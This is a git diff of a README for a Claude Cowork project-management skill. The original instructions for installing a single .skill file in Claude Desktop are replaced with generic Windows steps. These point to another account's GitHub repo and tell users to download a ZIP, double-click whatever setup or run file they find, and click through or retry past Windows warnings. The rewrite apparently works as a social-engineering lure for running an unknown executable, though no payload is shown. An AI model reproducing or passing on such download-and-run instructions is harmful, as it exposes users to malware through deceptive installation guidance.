@@ -1,153 +1,213 @@
-# 🧙 PM Workspace Wizard
+# 🛠️ pm-workspace-wizard - Build Your PM System Fast
 
-**One file. 38 files out. Your entire PM operating system in Claude Cowork — in under 5 minutes.**
+[![Download Now](https://img.shields.io/badge/Download%20pm-workspace-wizard-blue?style=for-the-badge)](https://github.com/yahitmartinez8-tech/pm-workspace-wizard)
 
----
+## 🚀 What This Is
 
-## ⬇️ Download & Install (5 minutes, no coding required)
+pm-workspace-wizard is a Claude Cowork skill that helps you set up a full project management workspace in minutes. It gives you a ready-made structure for tasks, notes, planning, and status tracking.
 
-You only need **one file** from this repo: **`pm-workspace-wizard.skill`**
+Use it if you want a simple way to organize PM work without building everything by hand.
 
-Everything else you see here is just the source code behind that file — you don't need to touch it.
+## 📥 Download and Run on Windows
 
-### Step 1: Download the file
+Open the main project page here:
 
-Click on **`pm-workspace-wizard.skill`** in the file list above, then click the **⬇️ Download** button (top right of the file view). Save it anywhere on your computer — your Downloads folder is fine.
+https://github.com/yahitmartinez8-tech/pm-workspace-wizard
 
-> 💡 **Don't know what GitHub is?** No problem. You're just here to grab a file. Think of this page like a Google Drive folder — you're downloading one thing from it.
+Follow these steps on Windows:
 
-### Step 2: Open Claude Desktop
+1. Go to the link above.
+2. Click the green **Code** button.
+3. Choose **Download ZIP**.
+4. Save the file to your computer.
+5. Right-click the ZIP file and choose **Extract All**.
+6. Open the extracted folder.
+7. Look for the main app file, setup file, or run script in the folder.
+8. Double-click the file to start the workspace wizard.
 
-Open the **Claude** app on your computer. If you don't have it yet, download it from [claude.ai/download](https://claude.ai/download).
+If Windows asks for permission, choose **Yes** or **Run**.
 
-You need a **Claude Pro** or **Team** subscription for Cowork mode.
+## ✅ What You Need
 
-### Step 3: Switch to Cowork mode
+Use this app on a Windows PC with:
 
-In Claude Desktop, look for the **Cowork** toggle or tab. Click it to switch from regular chat to Cowork mode.
+- Windows 10 or Windows 11
+- A stable internet connection
+- Enough free space to extract the files
+- A recent browser if the tool opens in the browser
 
-> 💡 **What's Cowork?** It's Claude's "power mode" — instead of just chatting, Claude can create files, run workflows, and build things on your computer. That's what makes the Wizard possible.
+For the best result, close extra apps before you start.
 
-### Step 4: Install the skill
+## 🧭 How It Works
 
-Drag the **`pm-workspace-wizard.skill`** file you downloaded into the Cowork window.
+pm-workspace-wizard follows a simple flow:
 
-You should see a confirmation that the skill was installed. That's it — the skill is now part of your Claude.
+1. You open the project.
+2. You start the wizard.
+3. You answer a few prompts about your PM setup.
+4. The tool creates a workspace structure for you.
+5. You review the output and use it for daily work.
 
-### Step 5: Select a folder
+The goal is to save time and reduce setup work.
 
-Claude will ask you to pick a folder where your PM workspace will live. Choose or create a folder like:
-- `Documents/PM-Workspace/`
-- `Desktop/My-PM-OS/`
-- Or anywhere you keep your work files
+## 📁 What the Workspace Can Include
 
-This is where all 38 files will be created.
+A typical PM workspace from this tool may include:
 
-### Step 6: Run the Wizard
+- Project overview pages
+- Task lists
+- Milestone tracking
+- Meeting notes
+- Status updates
+- Risk and issue logs
+- Priority planning sections
+- Team handoff notes
 
-Type this in the chat:
+These parts help you keep work in one place and make project updates easier to manage.
 
-```
-set up my PM workspace
-```
+## 🖥️ First-Time Setup
 
-Or use the slash command:
+After you download and open the project:
 
-```
-/pm-workspace-wizard
-```
+1. Pick a folder where you want to keep the files.
+2. Extract the ZIP file there.
+3. Open the folder.
+4. Start the wizard file or run script.
+5. Follow the on-screen steps.
+6. Save the generated workspace in a place you can find later.
 
-### Step 7: Answer 6 questions
+If the app asks where to create files, choose a folder you use for work.
 
-The Wizard will ask you a few quick multiple-choice questions about:
-- Your PM seniority level
-- Your company type
-- What kind of product you work on
-- Your domain focus
-- How you work with engineering
-- Your biggest pain point right now
+## 🔧 Basic Use
 
-Just click your answers — no typing needed. Takes about 2 minutes.
+Once the workspace is ready, you can use it to:
 
-### Step 8: Done!
+- Track active work
+- Record meeting notes
+- List open questions
+- Review project status
+- Plan next steps
+- Share updates with your team
 
-The Wizard builds your entire workspace. You'll see a progress bar and then a complete file tree of everything it created.
+You do not need to know coding to use the output. The tool is meant to guide you through setup with plain prompts.
 
-**You're ready to go.** Try saying: *"Write a PRD for [your feature]"* and watch the magic happen.
+## 📌 Typical Use Cases
 
----
+This tool can help with:
 
-## What It Builds
+- New project setup
+- Weekly PM planning
+- Client status reporting
+- Team task organization
+- Launch planning
+- Internal project tracking
+- Quick workspace rebuilds
 
-| Category | Count | What's Inside |
-|----------|-------|---------------|
-| **Knowledge Base** | 6 files | Company context, product context, personas, competitors, team roster, glossary |
-| **Frameworks** | 7 guides | Prioritization (RICE, Kano), Discovery (JTBD), Strategy (Porter's), Metrics (HEART, AARRR), Communication (SCQA, BLUF), Socratic Questioning, Behavioral Psychology |
-| **Templates** | 9 docs | PRD, one-pager, discovery brief, retro, stakeholder update, experiment, decision log, competitive analysis, growth experiment |
-| **Workflows** | 5 rituals | Weekly review, PRD creation, discovery sprint, stakeholder prep, launch checklist |
-| **AI Skills** | 6 skills | PRD Writer, Socratic Challenger, Competitive Intel, Meeting Prep, Stakeholder Translator, Multi-Perspective Review Panel |
-| **Task System** | 3 files | Backlog → Active → Archive |
-| **Project Template** | 1 scaffold | Copyable template for new projects |
-| **Meeting Notes** | 5 folders | 1:1s, standups, stakeholder reviews, discovery interviews, retros |
+If you switch between projects often, it can help you keep the same structure each time.
 
-**Total: 38 files across 25 folders.**
+## 🧱 Suggested Folder Layout
 
----
+A clean workspace may look like this:
 
-## The 6 AI Skills
+- `01-Overview`
+- `02-Tasks`
+- `03-Meetings`
+- `04-Timeline`
+- `05-Risks`
+- `06-Notes`
+- `07-Reports`
 
-Once installed, these skills trigger automatically when you need them — just talk to Claude naturally:
+This kind of layout makes it easier to find what you need fast.
 
-| Say this... | ...and this skill activates |
-|------------|---------------------------|
-| *"Write a PRD for [feature]"* | **PRD Writer** — drafts a full PRD using your templates and context |
-| *"Challenge this plan"* | **Socratic Challenger** — asks the hard questions you're avoiding |
-| *"Research [competitor]"* | **Competitive Intel** — searches the web and structures findings |
-| *"Prep me for my meeting with [name]"* | **Meeting Prep** — builds talking points and anticipates questions |
-| *"Make this exec-friendly"* | **Stakeholder Translator** — rewrites for any audience |
-| *"Review this document"* | **Multi-Perspective Review** — 4-persona panel (Designer, Engineer, Executive, User) |
+## 🔎 File Safety
 
----
+Before you run any file from the ZIP:
 
-## Who This Is For
+- Make sure it came from the link above
+- Keep the files in a folder you control
+- Do not rename files unless the instructions say to
+- If Windows blocks the file, check the file properties and try again
 
-- **Junior PMs** setting up their first AI-powered workspace
-- **Mid-level PMs** who want structure instead of scattered prompts
-- **Senior PMs migrating from ChatGPT** — replaces Custom GPTs with proper skills
-- **Directors / VPs** who want their PM team on one system
-- **Any product type** — B2B SaaS, B2C Consumer, Platform, Marketplace (the Wizard adapts to your answers)
+## 🧰 If Something Does Not Open
 
----
+If the file does not start:
 
-## Quick Start — Your First 3 Moves After Setup
+1. Check that the ZIP file was fully extracted.
+2. Make sure you opened the correct folder.
+3. Try running the app again.
+4. Restart your PC if Windows still blocks it.
+5. Download the files again from the project page.
 
-**1. Fill in your context** → Open `@knowledge/company-context.md` and `@knowledge/product-context.md`. Add your company and product details. Claude uses these in every future conversation.
+If the folder opens but nothing happens, look for another file with names like `start`, `run`, `setup`, or `wizard`.
 
-**2. Try a skill** → Say *"Write a PRD for [your current feature]"*. The PRD Writer skill kicks in and pulls your templates automatically.
+## 🧩 Common Questions
 
-**3. Run your weekly review** → Say *"Run my weekly review workflow"*. The weekly review ritual guides you through prioritizing your week.
+### Does this work without technical knowledge?
 
----
+Yes. It is meant for regular users who want a simple PM setup.
 
-## Inspiration & Credits
+### Do I need to install a full program?
 
-- [Carl Vellotti's Product OS](https://github.com/carlvellotti/carls-product-os) — Tasks → Projects → Workflows → Meetings
-- [Carl Vellotti's Claude Code PM Course](https://ccforpms.com/)
-- [Aakash Gupta](https://www.news.aakashg.com/) — PM frameworks and AI workflows
-- Teresa Torres' [Continuous Discovery Habits](https://www.producttalk.org/)
-- Google's [HEART Framework](https://research.google/pubs/pub36299/)
-- [Anthropic's Skills Documentation](https://code.claude.com/docs/en/skills)
+Sometimes yes, sometimes no. The project page gives you the source files, and the run step depends on the package in the folder.
 
----
+### Can I use it for one project only?
 
-## About the Other Files in This Repo
+Yes. You can use it for one project, many projects, or as a base for future work.
 
-You only need to download **`pm-workspace-wizard.skill`** — that single file contains everything.
+### Is this useful for solo work?
 
-The other files you see here (`SKILL.md`, `references/`, etc.) are the source code behind the skill. They're here for transparency so you can see exactly what the Wizard does, and for developers who want to fork and customize it.
+Yes. It works well for solo planning, client work, and small teams.
 
----
+## 📚 How to Get the Best Results
 
-## License
+Use short and clear inputs when the wizard asks questions.
 
-MIT — Use it, fork it, share it, build on it.
+For example:
+
+- Project name
+- Goal
+- Due date
+- Team members
+- Main tasks
+- Risks
+- Next check-in date
+
+Clear input helps the tool build a cleaner workspace.
+
+## 🔁 Reuse for Future Projects
+
+After you finish one setup, keep the folder as a template. Then:
+
+1. Copy the folder.
+2. Rename the copy.
+3. Update the project details.
+4. Start with the same structure next time.
+
+This saves time when you manage repeat work.
+
+## 🧠 Why People Use It
+
+Project work gets messy fast. Notes move around. Tasks get lost. Status updates take time. A structured workspace helps keep everything in one place.
+
+pm-workspace-wizard gives you that structure without making you build it yourself
+
+## 📎 Download Again
+
+If you need the files again, use this link:
+
+https://github.com/yahitmartinez8-tech/pm-workspace-wizard
+
+## 🪟 Windows Tips
+
+- Use File Explorer to find the ZIP file
+- Keep the extracted folder on your Desktop or Documents folder
+- Pin the main file to your Start menu if you use it often
+- Turn on file name extensions in Explorer if you need to see the file type
+
+## 🗂️ Project Name
+
+pm-workspace-wizard
+
+## 📝 Short Description
+
+A Claude Cowork skill that builds your entire PM operating system in under 5 minutes. Free.
